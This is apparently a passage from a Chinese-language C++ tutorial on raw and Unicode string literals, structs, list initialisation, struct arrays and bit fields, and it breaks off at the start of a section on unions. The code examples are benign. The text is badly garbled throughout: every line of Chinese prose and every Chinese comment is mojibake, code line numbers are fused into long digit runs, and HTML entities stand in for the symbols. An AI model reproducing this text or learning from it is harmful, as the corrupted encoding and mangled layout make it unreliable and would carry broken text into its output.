ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; // åŸå§‹å­—ç¬¦ä¸²å­—é¢å€¼ std::string path1 = &quot;C:\\\\Program Files\\\\My App\\\\&quot;; // éœ€è¦è½¬ä¹‰åæ–œæ  std::string path2 = R&quot;(C:\\Program Files\\My App\\)&quot;; // ä½¿ç”¨åŸå§‹å­—ç¬¦ä¸²ï¼Œæ— éœ€è½¬ä¹‰ std::string regex = R&quot;(\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]&#123;2,&#125;\\b)&quot;; // æ­£åˆ™è¡¨è¾¾å¼ std::string html = R&quot;delimiter(&lt;html&gt; &lt;head&gt;&lt;title&gt;Raw String&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;p&gt;&quot;Hello!&quot;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;)delimiter&quot;; std::cout &lt;&lt; &quot;Path 1: &quot; &lt;&lt; path1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Path 2: &quot; &lt;&lt; path2 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Regex: &quot; &lt;&lt; regex &lt;&lt; std::endl; std::cout &lt;&lt; &quot;HTML:\\n&quot; &lt;&lt; html &lt;&lt; std::endl; // Unicode å­—ç¬¦ä¸²å­—é¢å€¼ (ä¸»è¦ç”¨äºéœ€è¦ç‰¹å®šç¼–ç çš„åœºæ™¯) const char* utf8_str = u8&quot;ä½ å¥½ï¼Œä¸–ç•Œ&quot;; // UTF-8 (éœ€è¦æ”¯æŒ UTF-8 çš„ç¯å¢ƒ/ç»ˆç«¯æ‰èƒ½æ­£ç¡®æ˜¾ç¤º) const char16_t* utf16_str = u&quot;ä½ å¥½ï¼Œä¸–ç•Œ&quot;; // UTF-16 const char32_t* utf32_str = U&quot;ä½ å¥½ï¼Œä¸–ç•Œ&quot;; // UTF-32 std::cout &lt;&lt; &quot;UTF-8 String (may not display correctly): &quot; &lt;&lt; utf8_str &lt;&lt; std::endl; // å¤„ç†å’Œæ‰“å° UTF-16/32 é€šå¸¸éœ€è¦ä¸“é—¨çš„åº“æˆ–å‡½æ•° // std::cout &lt;&lt; utf16_str; // ä¸èƒ½ç›´æ¥ç”¨ cout æ‰“å° char16_t* / char32_t* return 0;&#125; åŸå§‹å­—ç¬¦ä¸²å­—é¢å€¼åœ¨å¤„ç†åŒ…å«ç‰¹æ®Šå­—ç¬¦çš„æ–‡æœ¬æ—¶éå¸¸æ–¹ä¾¿ã€‚Unicode å­—ç¬¦ä¸²å­—é¢å€¼åˆ™ä¸ºå¤„ç†å›½é™…åŒ–æ–‡æœ¬æä¾›äº†æ ‡å‡†åŒ–çš„åŸºç¡€ã€‚ 4.4 ç»“æ„ç®€ä»‹æ•°ç»„å…è®¸æˆ‘ä»¬å­˜å‚¨å¤šä¸ªç›¸åŒç±»å‹çš„æ•°æ®ã€‚ä½†æœ‰æ—¶æˆ‘ä»¬éœ€è¦å°†ä¸åŒç±»å‹çš„æ•°æ®ç»„åˆæˆä¸€ä¸ªå•ä¸€çš„ã€æœ‰æ„ä¹‰çš„å•å…ƒã€‚ä¾‹å¦‚ï¼Œæè¿°ä¸€ä»¶å•†å“å¯èƒ½éœ€è¦å•†å“åç§°ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€æ•°é‡ï¼ˆæ•´æ•°ï¼‰å’Œå•ä»·ï¼ˆæµ®ç‚¹æ•°ï¼‰ã€‚C++ çš„ç»“æ„ (Structure) å°±æä¾›äº†è¿™ç§èƒ½åŠ›ã€‚ ç»“æ„æ˜¯ä¸€ç§ç”¨æˆ·å®šä¹‰çš„å¤åˆç±»å‹ï¼Œå®ƒå…è®¸å°†å¤šä¸ªä¸åŒç±»å‹çš„æ•°æ®é¡¹ï¼ˆç§°ä¸ºæˆå‘˜ (member) æˆ–**å­—æ®µ (field)**ï¼‰æ†ç»‘åœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªæ–°çš„æ•°æ®ç±»å‹ã€‚ 4.4.1 åœ¨ç¨‹åºä¸­ä½¿ç”¨ç»“æ„ä½¿ç”¨ç»“æ„é€šå¸¸æ¶‰åŠä»¥ä¸‹æ­¥éª¤ï¼š å®šä¹‰ç»“æ„: ä½¿ç”¨ struct å…³é”®å­—å®šä¹‰ä¸€ä¸ªæ–°çš„ç»“æ„ç±»å‹ï¼Œå¹¶åœ¨èŠ±æ‹¬å· &#123;&#125; å†…å£°æ˜å…¶æˆå‘˜ã€‚ç»“æ„å®šä¹‰é€šå¸¸æ”¾åœ¨ main() å‡½æ•°ä¹‹å‰æˆ–å•ç‹¬çš„å¤´æ–‡ä»¶ä¸­ã€‚ å£°æ˜ç»“æ„å˜é‡: ä½¿ç”¨å®šä¹‰å¥½çš„ç»“æ„ç±»å‹åæ¥å£°æ˜å˜é‡ã€‚ è®¿é—®ç»“æ„æˆå‘˜: ä½¿ç”¨æˆå‘˜è¿ç®—ç¬¦ï¼ˆç‚¹è¿ç®—ç¬¦ .) æ¥è®¿é—®ç»“æ„å˜é‡çš„ç‰¹å®šæˆå‘˜ã€‚ ç»“æ„å®šä¹‰è¯­æ³•: 12345struct StructureName &#123; memberType1 memberName1; memberType2 memberName2; // ... more members&#125;; // æ³¨æ„å®šä¹‰æœ«å°¾çš„åˆ†å· ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;string&gt; // ä¸ºäº†ä½¿ç”¨ string// 1. å®šä¹‰ç»“æ„: æè¿°å……æ°”äº§å“çš„ç»“æ„ä½“struct Inflatable &#123; std::string name; // å•†å“åç§° (string ç±»å‹æˆå‘˜) float volume; // ä½“ç§¯ (float ç±»å‹æˆå‘˜) double price; // ä»·æ ¼ (double ç±»å‹æˆå‘˜)&#125;;int main() &#123; // 2. å£°æ˜ç»“æ„å˜é‡ Inflatable product1; // å£°æ˜ä¸€ä¸ª Inflatable ç±»å‹çš„å˜é‡ product1 Inflatable product2; // å£°æ˜å¦ä¸€ä¸ª Inflatable ç±»å‹çš„å˜é‡ product2 // 3. è®¿é—®å¹¶èµ‹å€¼ç»“æ„æˆå‘˜ product1.name = &quot;Awesome Air Mattress&quot;; product1.volume = 1.8f; product1.price = 49.99; // ä¹Ÿå¯ä»¥åœ¨å£°æ˜æ—¶è¿›è¡Œåˆå§‹åŒ– (C++98/03 é£æ ¼ï¼Œéœ€è¦æŒ‰é¡ºåº) Inflatable product3 = &#123;&quot;Giant Swan Floatie&quot;, 2.5f, 79.95&#125;; // è®¿é—®å¹¶è¾“å‡ºæˆå‘˜ std::cout &lt;&lt; &quot;Product 1 Name: &quot; &lt;&lt; product1.name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Product 1 Price: $&quot; &lt;&lt; product1.price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Product 3 Name: &quot; &lt;&lt; product3.name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Product 3 Volume: &quot; &lt;&lt; product3.volume &lt;&lt; &quot; cubic meters&quot; &lt;&lt; std::endl; // ç»“æ„å˜é‡ä¹‹é—´å¯ä»¥ç›´æ¥èµ‹å€¼ (æˆå‘˜é€ä¸ªå¤åˆ¶) product2 = product1; std::cout &lt;&lt; &quot;Product 2 Name (after assignment): &quot; &lt;&lt; product2.name &lt;&lt; std::endl; return 0;&#125; struct Inflatable &#123; ... &#125;;: å®šä¹‰äº†ä¸€ä¸ªåä¸º Inflatable çš„æ–°ç±»å‹ã€‚ Inflatable product1;: åˆ›å»ºäº†ä¸€ä¸ª Inflatable ç±»å‹çš„å˜é‡ï¼ˆå¯¹è±¡ï¼‰ã€‚ product1.name = ...;: ä½¿ç”¨ç‚¹è¿ç®—ç¬¦è®¿é—® product1 çš„ name æˆå‘˜å¹¶èµ‹å€¼ã€‚ 4.4.2 C++11ç»“æ„åˆå§‹åŒ–C++11 å¼•å…¥çš„åˆ—è¡¨åˆå§‹åŒ–ï¼ˆèŠ±æ‹¬å·åˆå§‹åŒ–ï¼‰ä¹Ÿé€‚ç”¨äºç»“æ„ä½“ï¼Œæä¾›äº†æ›´çµæ´»ã€æ›´å®‰å…¨çš„åˆå§‹åŒ–æ–¹å¼ã€‚ ç‰¹ç‚¹: å¯ä»¥çœç•¥ç­‰å· =: ä¸æ•°ç»„ç±»ä¼¼ï¼Œå¯ä»¥åœ¨åˆå§‹åŒ–æ—¶çœç•¥ç­‰å·ã€‚ å¯ä»¥æŒ‰æˆå‘˜é¡ºåºåˆå§‹åŒ–: StructType var &#123;value1, value2, ...&#125;; å¯ä»¥åˆå§‹åŒ–éƒ¨åˆ†æˆå‘˜ (C++20 designated initializers): C++20 å…è®¸é€šè¿‡æŒ‡å®šæˆå‘˜åè¿›è¡Œåˆå§‹åŒ–ï¼Œå¯ä»¥ä¸æŒ‰é¡ºåºæˆ–åªåˆå§‹åŒ–éƒ¨åˆ†æˆå‘˜ã€‚ä½†åœ¨ C++11/14/17 ä¸­ï¼Œé€šå¸¸éœ€è¦æŒ‰é¡ºåºæä¾›å€¼ã€‚ ç©ºèŠ±æ‹¬å·åˆå§‹åŒ–: StructType var &#123;&#125;; ä¼šå°†æ‰€æœ‰æˆå‘˜è¿›è¡Œé›¶åˆå§‹åŒ–ï¼ˆæ•°å€¼ç±»å‹ä¸º0ï¼ŒæŒ‡é’ˆä¸º nullptrï¼Œbool ä¸º falseï¼Œç±»ç±»å‹ä¼šè°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°ï¼‰ã€‚ ç¦æ­¢ç¼©çª„è½¬æ¢: ä¸æ•°ç»„ä¸€æ ·ï¼Œåˆ—è¡¨åˆå§‹åŒ–ä¸å…è®¸å¯èƒ½ä¸¢å¤±ä¿¡æ¯çš„ç¼©çª„è½¬æ¢ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;string&gt;struct Product &#123; std::string id; int quantity; double price;&#125;;int main() &#123; // C++11 åˆ—è¡¨åˆå§‹åŒ– (çœç•¥ç­‰å·) Product item1 &#123; &quot;A123&quot;, 50, 19.95 &#125;; // æŒ‰é¡ºåºåˆå§‹åŒ–æ‰€æœ‰æˆå‘˜ // çœç•¥ç­‰å·ï¼Œéƒ¨åˆ†åˆå§‹åŒ– (C++11/14/17 ä¸­ï¼Œæœªæä¾›çš„æˆå‘˜ä¼šè¢«å€¼åˆå§‹åŒ–/é›¶åˆå§‹åŒ–) // æ³¨æ„ï¼šè¿™ç§éƒ¨åˆ†åˆå§‹åŒ–å¯¹äºåŒ…å« std::string ç­‰ç±»ç±»å‹æˆå‘˜æ—¶ï¼Œè¡Œä¸ºä¾èµ–äºè¿™äº›ç±»çš„é»˜è®¤æ„é€ å‡½æ•° // Product item2 &#123; &quot;B456&quot;, 100 &#125;; // price ä¼šè¢«é›¶åˆå§‹åŒ–ä¸º 0.0 // ç©ºèŠ±æ‹¬å·è¿›è¡Œé›¶åˆå§‹åŒ– Product item3 &#123;&#125;; // id ä¸ºç©ºå­—ç¬¦ä¸², quantity ä¸º 0, price ä¸º 0.0 std::cout &lt;&lt; &quot;Item 1 ID: &quot; &lt;&lt; item1.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item1.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item1.price &lt;&lt; std::endl; // std::cout &lt;&lt; &quot;Item 2 ID: &quot; &lt;&lt; item2.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item2.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item2.price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Item 3 ID: \\&quot;&quot; &lt;&lt; item3.id &lt;&lt; &quot;\\&quot;, Qty: &quot; &lt;&lt; item3.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item3.price &lt;&lt; std::endl; // ç¦æ­¢ç¼©çª„è½¬æ¢ // Product item_error &#123; &quot;C789&quot;, 10.5, 25.0 &#125;; // é”™è¯¯! 10.5 (double) åˆ° int æ˜¯ç¼©çª„è½¬æ¢ // C++20 Designated Initializers (å¦‚æœç¼–è¯‘å™¨æ”¯æŒ C++20) // Product item4 &#123; .id = &quot;D001&quot;, .price = 99.99 &#125;; // quantity ä¼šè¢«é›¶åˆå§‹åŒ– // std::cout &lt;&lt; &quot;Item 4 ID: &quot; &lt;&lt; item4.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item4.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item4.price &lt;&lt; std::endl; return 0;&#125; 4.4.3 ç»“æ„å¯ä»¥å°†stringç±»ä½œä¸ºæˆå‘˜å—æ˜¯çš„ï¼Œç»å¯¹å¯ä»¥ã€‚ æ­£å¦‚åœ¨ 4.4.1 å’Œ 4.4.2 çš„ç¤ºä¾‹ä¸­çœ‹åˆ°çš„ (Inflatable å’Œ Product ç»“æ„)ï¼Œstd::string å¯¹è±¡å¯ä»¥åƒ intã€double æˆ–å…¶ä»–ä»»ä½•ç±»å‹ä¸€æ ·ä½œä¸ºç»“æ„çš„æˆå‘˜ã€‚ è¿™ä½¿å¾—ç»“æ„èƒ½å¤Ÿæ–¹ä¾¿åœ°åŒ…å«æ–‡æœ¬ä¿¡æ¯ï¼Œå¹¶åˆ©ç”¨ string ç±»æä¾›çš„æ‰€æœ‰åŠŸèƒ½ï¼ˆè‡ªåŠ¨å†…å­˜ç®¡ç†ã€æ‹¼æ¥ã€æŸ¥æ‰¾ç­‰ï¼‰ã€‚ ç¤ºä¾‹å›é¡¾: 1234567891011121314151617181920#include &lt;string&gt;struct Student &#123; std::string name; // string æˆå‘˜ int studentID; double gpa;&#125;;int main() &#123; Student s1 &#123; &quot;Alice Wonderland&quot;, 12345, 3.8 &#125;; Student s2; s2.name = &quot;Bob The Builder&quot;; // å¯ä»¥åƒæ™®é€š string ä¸€æ ·æ“ä½œ s2.studentID = 67890; s2.gpa = 3.5; std::cout &lt;&lt; s1.name &lt;&lt; &quot; has GPA: &quot; &lt;&lt; s1.gpa &lt;&lt; std::endl; std::cout &lt;&lt; s2.name &lt;&lt; &quot; has ID: &quot; &lt;&lt; s2.studentID &lt;&lt; std::endl; return 0;&#125; 4.4.4 å…¶ä»–ç»“æ„å±æ€§ç»“æ„åœ¨ C++ ä¸­å…·æœ‰ä¸€äº›æ–¹ä¾¿çš„å±æ€§ï¼š èµ‹å€¼ (Assignment): å¯ä»¥ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦ = å°†ä¸€ä¸ªç»“æ„å˜é‡çš„å€¼èµ‹ç»™åŒç±»å‹çš„å¦ä¸€ä¸ªç»“æ„å˜é‡ã€‚è¿™ä¼šæ‰§è¡Œ**æˆå‘˜é€ä¸€å¤åˆ¶ (memberwise copy)**ï¼Œå³å°†æºç»“æ„æ¯ä¸ªæˆå‘˜çš„å€¼å¤åˆ¶åˆ°ç›®æ ‡ç»“æ„å¯¹åº”æˆå‘˜ä¸­ã€‚ 123Student s1 = &#123;&quot;Charlie&quot;, 111, 3.9&#125;;Student s2;s2 = s1; // s2 çš„ name, studentID, gpa éƒ½è¢«è®¾ç½®ä¸º s1 çš„å€¼ ä½œä¸ºå‡½æ•°å‚æ•° (Pass by Value): å¯ä»¥å°†ç»“æ„å˜é‡æŒ‰å€¼ä¼ é€’ç»™å‡½æ•°ã€‚å‡½æ•°ä¼šæ”¶åˆ°ç»“æ„çš„ä¸€ä¸ªå‰¯æœ¬ï¼Œå¯¹å‰¯æœ¬æˆå‘˜çš„ä¿®æ”¹ä¸ä¼šå½±å“åŸå§‹ç»“æ„å˜é‡ã€‚ 1234567void displayStudent(Student s) &#123; // s æ˜¯ä¼ å…¥ç»“æ„çš„ä¸€ä¸ªå‰¯æœ¬ std::cout &lt;&lt; &quot;ID: &quot; &lt;&lt; s.studentID &lt;&lt; &quot;, Name: &quot; &lt;&lt; s.name &lt;&lt; std::endl; s.name = &quot;Changed&quot;; // åªä¿®æ”¹å‰¯æœ¬&#125;// ...displayStudent(s1); // ä¼ é€’ s1 çš„å‰¯æœ¬std::cout &lt;&lt; s1.name; // è¾“å‡º &quot;Charlie&quot;ï¼Œæœªè¢«æ”¹å˜ ä½œä¸ºå‡½æ•°å‚æ•° (Pass by Reference/Pointer): ä¸ºäº†é¿å…å¤åˆ¶æ•´ä¸ªç»“æ„çš„å¼€é”€ï¼Œæˆ–è€…éœ€è¦åœ¨å‡½æ•°ä¸­ä¿®æ”¹åŸå§‹ç»“æ„ï¼Œé€šå¸¸æŒ‰å¼•ç”¨æˆ–æŒ‡é’ˆä¼ é€’ç»“æ„ã€‚ 123456789void updateGPA(Student&amp; s, double newGPA) &#123; // æŒ‰å¼•ç”¨ä¼ é€’ï¼Œå¯ä»¥ä¿®æ”¹åŸå§‹ç»“æ„ s.gpa = newGPA;&#125;void printID(const Student* sPtr) &#123; // æŒ‰æŒ‡é’ˆä¼ é€’ (const é˜²æ­¢æ„å¤–ä¿®æ”¹) std::cout &lt;&lt; &quot;ID: &quot; &lt;&lt; sPtr-&gt;studentID &lt;&lt; std::endl; // ä½¿ç”¨ -&gt; è®¿é—®æŒ‡é’ˆæŒ‡å‘çš„ç»“æ„æˆå‘˜&#125;// ...updateGPA(s1, 4.0); // ä¿®æ”¹åŸå§‹ s1printID(&amp;s1); // ä¼ é€’ s1 çš„åœ°å€ ä½œä¸ºå‡½æ•°è¿”å›å€¼: å‡½æ•°å¯ä»¥è¿”å›ä¸€ä¸ªç»“æ„ã€‚ 123456789Student createStudent(std::string name, int id, double gpa) &#123; Student temp; temp.name = name; temp.studentID = id; temp.gpa = gpa; return temp; // è¿”å›ä¸€ä¸ª Student ç»“æ„&#125;// ...Student s3 = createStudent(&quot;David&quot;, 222, 3.7); è¿™äº›ç‰¹æ€§ä½¿å¾—ç»“æ„æˆä¸ºç»„ç»‡å’Œä¼ é€’ç›¸å…³æ•°æ®çš„å¼ºå¤§å·¥å…·ã€‚ 4.4.5 ç»“æ„æ•°ç»„å¯ä»¥åˆ›å»º**ç»“æ„æ•°ç»„ (Array of Structures)**ï¼Œå³æ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªç»“æ„å˜é‡ã€‚è¿™å¯¹äºå¤„ç†ä¸€ç»„å…·æœ‰ç›¸åŒç»“æ„çš„æ•°æ®éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚ä¸€ä¸ªç­çº§çš„å­¦ç”Ÿä¿¡æ¯ã€ä¸€ä¸ªå•†åº—çš„åº“å­˜åˆ—è¡¨ç­‰ã€‚ å£°æ˜å’Œåˆå§‹åŒ–: å£°æ˜ç»“æ„æ•°ç»„ä¸å£°æ˜æ™®é€šæ•°ç»„ç±»ä¼¼ï¼Œåªæ˜¯å…ƒç´ ç±»å‹æ˜¯ç»“æ„ç±»å‹ã€‚åˆå§‹åŒ–å¯ä»¥ä½¿ç”¨åµŒå¥—çš„èŠ±æ‹¬å·ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;string&gt;struct Student &#123; std::string name; int studentID;&#125;;const int CLASS_SIZE = 3;int main() &#123; // å£°æ˜ä¸€ä¸ªåŒ…å« CLASS_SIZE ä¸ª Student ç»“æ„çš„æ•°ç»„ Student classRoster[CLASS_SIZE]; // åˆå§‹åŒ–ç»“æ„æ•°ç»„ (ä½¿ç”¨åµŒå¥—èŠ±æ‹¬å·) Student graduates[2] = &#123; &#123;&quot;Alice&quot;, 101&#125;, // åˆå§‹åŒ– graduates[0] &#123;&quot;Bob&quot;, 102&#125; // åˆå§‹åŒ– graduates[1] &#125;; // C++11 åˆ—è¡¨åˆå§‹åŒ– Student freshmen[CLASS_SIZE] &#123; &#123;&quot;Charlie&quot;, 201&#125;, &#123;&quot;David&quot;, 202&#125;, &#123;&quot;Eve&quot;, 203&#125; &#125;; // è®¿é—®ç»“æ„æ•°ç»„ä¸­çš„å…ƒç´ åŠå…¶æˆå‘˜ classRoster[0].name = &quot;Frank&quot;; classRoster[0].studentID = 301; std::cout &lt;&lt; &quot;Graduate 1: &quot; &lt;&lt; graduates[0].name &lt;&lt; &quot; (ID: &quot; &lt;&lt; graduates[0].studentID &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Freshman 3 ID: &quot; &lt;&lt; freshmen[2].studentID &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Roster 1 Name: &quot; &lt;&lt; classRoster[0].name &lt;&lt; std::endl; // éå†ç»“æ„æ•°ç»„ std::cout &lt;&lt; &quot;\\nFreshmen List:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; CLASS_SIZE; ++i) &#123; std::cout &lt;&lt; &quot; - &quot; &lt;&lt; freshmen[i].name &lt;&lt; &quot; (ID: &quot; &lt;&lt; freshmen[i].studentID &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; &#125; return 0;&#125; Student classRoster[CLASS_SIZE];: å£°æ˜äº†ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æ˜¯ Student ç»“æ„ã€‚ graduates[0] = &#123;&quot;Alice&quot;, 101&#125;;: åˆå§‹åŒ–æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆä¸€ä¸ª Student ç»“æ„ï¼‰ã€‚ freshmen[i].name: è®¿é—®æ•°ç»„ freshmen ä¸­ç´¢å¼•ä¸º i çš„å…ƒç´ çš„ name æˆå‘˜ã€‚ 4.4.6 ç»“æ„ä¸­çš„ä½å­—æ®µä½å­—æ®µ (Bit Field) æ˜¯ä¸€ç§ç‰¹æ®Šçš„ç»“æ„æˆå‘˜ï¼Œå®ƒå…è®¸ä½ æŒ‡å®šæˆå‘˜å˜é‡å ç”¨çš„**ä½æ•° (bits)**ã€‚è¿™ä¸»è¦ç”¨äºéœ€è¦ç²¾ç¡®æ§åˆ¶å†…å­˜å¸ƒå±€æˆ–ä¸ç¡¬ä»¶å¯„å­˜å™¨äº¤äº’çš„åœºæ™¯ã€‚ è¯­æ³•: åœ¨ç»“æ„å®šä¹‰ä¸­ï¼Œæˆå‘˜ååé¢è·Ÿä¸€ä¸ªå†’å· : å’Œä¸€ä¸ªæ•´æ•°å¸¸é‡ï¼Œè¡¨ç¤ºè¯¥æˆå‘˜å ç”¨çš„ä½æ•°ã€‚ 1234567struct RegisterFlags &#123; unsigned int readEnable : 1; // å ç”¨ 1 ä½ unsigned int writeEnable : 1; // å ç”¨ 1 ä½ unsigned int mode : 2; // å ç”¨ 2 ä½ unsigned int reserved : 4; // å ç”¨ 4 ä½ (é€šå¸¸ç”¨äºå¡«å……æˆ–å¯¹é½) // ...&#125;; ç‰¹ç‚¹å’Œæ³¨æ„äº‹é¡¹: ç±»å‹: ä½å­—æ®µçš„ç±»å‹é€šå¸¸æ˜¯ unsigned int æˆ– signed intï¼ˆæˆ– intï¼Œå…¶ç¬¦å·æ€§å–å†³äºå®ç°ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯ bool (C++11ï¼Œç­‰æ•ˆäº : 1)ã€‚ å†…å­˜èŠ‚çœ: å½“å¤šä¸ªæ ‡å¿—æˆ–å°èŒƒå›´æ•°å€¼éœ€è¦å­˜å‚¨æ—¶ï¼Œä½å­—æ®µå¯ä»¥æ˜¾è‘—èŠ‚çœå†…å­˜ï¼Œå°†å®ƒä»¬æ‰“åŒ…åˆ°å•ä¸ªæ•´æ•°æˆ–å‡ ä¸ªå­—èŠ‚ä¸­ã€‚ ç¡¬ä»¶æ¥å£: å¸¸ç”¨äºæ˜ å°„ç¡¬ä»¶è®¾å¤‡å¯„å­˜å™¨çš„ç‰¹å®šä½ã€‚ è®¿é—®: åƒæ™®é€šç»“æ„æˆå‘˜ä¸€æ ·ä½¿ç”¨ç‚¹è¿ç®—ç¬¦è®¿é—®ï¼Œä½†ä¸èƒ½è·å–ä½å­—æ®µçš„åœ°å€ï¼ˆ&amp; è¿ç®—ç¬¦ä¸èƒ½ç”¨äºä½å­—æ®µï¼‰ã€‚ å¯ç§»æ¤æ€§: ä½å­—æ®µçš„å†…å­˜å¸ƒå±€ï¼ˆä½çš„æ’åˆ—é¡ºåºã€è·¨å­—èŠ‚è¾¹ç•Œçš„å¤„ç†ï¼‰å¯èƒ½å› ç¼–è¯‘å™¨å’Œå¹³å°è€Œå¼‚ï¼Œå› æ­¤åœ¨éœ€è¦è·¨å¹³å°å…¼å®¹æ€§çš„ä»£ç ä¸­åº”è°¨æ…ä½¿ç”¨ã€‚ å¤§å°é™åˆ¶: ä½æ•°ä¸èƒ½è¶…è¿‡å…¶åŸºç¡€ç±»å‹çš„ä½æ•°ï¼ˆä¾‹å¦‚ï¼Œunsigned int çš„ä½å­—æ®µä¸èƒ½è¶…è¿‡ int çš„ä½æ•°ï¼‰ã€‚ åŒ¿åä½å­—æ®µ: å¯ä»¥ä½¿ç”¨æœªå‘½åçš„ä½å­—æ®µæ¥å¡«å……æˆ–å¯¹é½ï¼Œä¾‹å¦‚ unsigned int : 2;ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;// å‡è®¾ç”¨äºæ§åˆ¶æŸä¸ªè®¾å¤‡çš„çŠ¶æ€struct DeviceStatus &#123; // æ‰“åŒ…åˆ°å•ä¸ªå­—èŠ‚ (å‡è®¾ unsigned int è‡³å°‘ 8 ä½) unsigned int powerOn : 1; unsigned int errorFlag : 1; unsigned int channel : 3; // å¯ä»¥è¡¨ç¤º 0-7 unsigned int : 3; // å¡«å……æœªä½¿ç”¨çš„ 3 ä½ï¼Œä½¿æ€»å…± 8 ä½&#125;;int main() &#123; DeviceStatus status; // è®¾ç½®ä½å­—æ®µçš„å€¼ status.powerOn = 1; // è®¾å¤‡å¼€æœº status.errorFlag = 0; // æ— é”™è¯¯ status.channel = 5; // è®¾ç½®é€šé“ä¸º 5 // è¯»å–ä½å­—æ®µçš„å€¼ std::cout &lt;&lt; &quot;Device Status:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Power On: &quot; &lt;&lt; status.powerOn &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Error Flag: &quot; &lt;&lt; status.errorFlag &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Channel: &quot; &lt;&lt; status.channel &lt;&lt; std::endl; // ä½å­—æ®µé€šå¸¸æ‰“åŒ…å­˜å‚¨ std::cout &lt;&lt; &quot;Size of DeviceStatus struct: &quot; &lt;&lt; sizeof(DeviceStatus) &lt;&lt; &quot; byte(s)&quot; &lt;&lt; std::endl; // è¾“å‡ºé€šå¸¸æ˜¯ 1 æˆ– 4 (å–å†³äºç¼–è¯‘å™¨å¦‚ä½•å¯¹é½å’Œæ‰“åŒ…ï¼Œä»¥åŠ int çš„å¤§å°) // æ£€æŸ¥ç‰¹å®šæ ‡å¿— if (status.powerOn) &#123; std::cout &lt;&lt; &quot;Device is powered on.&quot; &lt;&lt; std::endl; &#125; // ä¸èƒ½è·å–ä½å­—æ®µåœ°å€ // unsigned int* pPower = &amp;status.powerOn; // é”™è¯¯! return 0;&#125; ä½å­—æ®µæ˜¯ä¸€ç§åº•å±‚å·¥å…·ï¼Œé€‚ç”¨äºç‰¹å®šåœºæ™¯ï¼Œä½†åœ¨å¸¸è§„åº”ç”¨ç¨‹åºå¼€å‘ä¸­ä¸å¸¸ç”¨ã€‚ 4.5 å…±ç”¨ä½“å…±ç”¨ä½“ (Union) æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ•°æ®ç»“æ„ï¼Œå®ƒä¹Ÿå…è®¸åœ¨ä¸€ä¸ªç»“æ„ä¸­å­˜å‚¨ä¸åŒçš„æ•°æ®ç±»å‹ï¼Œä½†ä¸ç»“æ„ä½“ (struct) ä¸åŒçš„æ˜¯ï¼Œå…±ç”¨ä½“çš„æ‰€æœ‰æˆå‘˜å…±äº«åŒä¸€å—å†…å­˜ç©ºé—´ã€‚ æ ¸å¿ƒç‰¹ç‚¹: å†…å­˜å…±äº«: å…±ç”¨ä½“çš„å¤§å°ç”±å…¶æœ€å¤§çš„æˆå‘˜çš„å¤§å°å†³å®šã€‚æ‰€æœ‰æˆå‘˜éƒ½ä»ç›¸åŒçš„å†…å­˜åœ°å€å¼€å§‹å­˜å‚¨ã€‚ åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªæˆå‘˜æœ‰æ•ˆ: åœ¨ä»»ä½•æ—¶åˆ»ï¼Œä½ åªèƒ½æœ‰æ•ˆåœ°å­˜å‚¨å’Œä½¿ç”¨å…±ç”¨ä½“ä¸­çš„ä¸€ä¸ªæˆå‘˜çš„å€¼ã€‚å½“ä½ ç»™ä¸€ä¸ªæˆå‘˜èµ‹å€¼æ—¶ï¼Œå¯èƒ½ä¼šè¦†ç›–æ‰å…¶ä»–æˆå‘˜çš„æ•°æ®ã€‚ èŠ‚çœå†…å­˜: å½“ä½ éœ€è¦å­˜å‚¨å¤šç§ç±»å‹çš„æ•°æ®ï¼Œä½†çŸ¥é“åœ¨ä»»ä½•æ—¶å€™åªéœ€è¦ç”¨åˆ°å…¶ä¸­ä¸€ç§æ—¶ï¼Œå…±ç”¨ä½“å¯ä»¥èŠ‚çœå†…å­˜ï¼Œå› ä¸ºå®ƒåªéœ€è¦åˆ†é…è¶³å¤Ÿå®¹çº³æœ€å¤§æˆå‘˜çš„ç©ºé—´ã€‚ å®šä¹‰å…±ç”¨ä½“: ä½¿ç”¨ union å…³é”®å­—å®šä¹‰ï¼Œè¯­æ³•ä¸ 